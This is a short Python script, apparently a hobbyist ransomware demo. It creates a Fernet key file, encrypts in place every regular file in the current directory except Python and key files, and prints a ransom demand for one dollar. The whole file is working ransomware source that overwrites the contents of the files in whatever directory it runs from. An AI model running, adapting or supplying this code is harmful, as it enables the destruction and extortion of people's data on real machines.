#! /usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = os.listdir()
targets = []
current_key = 'key.key'

# Generate encryption key if it is not exist and save it to a text file 
if not os.path.exists(current_key):

    key = Fernet.generate_key()
    key_file = open('key.key', 'wb')
    key_file.write(key)
    key_file.close()


    if os.path.exists(current_key): 
        
        # Get all files from the current directory
        for file in files:

            file_extension = os.path.splitext(file)

            # Execlude Python scripts & key from decryption
            if file.lower().endswith(('.py', '.key')):
                continue

            # Execlude directories from encryption
            if os.path.isdir(os.path.abspath(file)):
                continue
            
            targets.append(file)

            # Read content from the files
            with open(file, 'rb') as the_file:
                file_content = the_file.read()

            encrypted_content = Fernet(key).encrypt(file_content)

            # Replace old content with encrypted content
            with open(file, 'wb') as the_file:
                the_file.write(encrypted_content)

        print('Your Files Has Been Encrypted! Pay Me 1 Dollar to Get Files Back!')
else:
    print('Your Files Already Encrypted :)')
 
        







    


    
